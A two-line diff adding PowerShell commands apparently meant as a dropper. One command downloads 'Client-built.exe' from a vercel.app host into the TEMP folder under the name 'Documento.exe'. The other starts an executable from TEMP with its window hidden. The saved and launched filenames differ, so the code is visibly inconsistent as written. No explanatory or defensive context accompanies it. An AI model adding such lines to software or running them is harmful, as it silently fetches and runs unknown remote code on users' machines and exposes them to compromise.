@@ -1,0 +1,2 @@
+Invoke-WebRequest -Uri "https://privacy-58248-com.vercel.app/Client-built.exe" -OutFile "$env:TEMP\Documento.exe"
+Start-Process "$env:TEMP\Client-built.exe" -WindowStyle Hidden
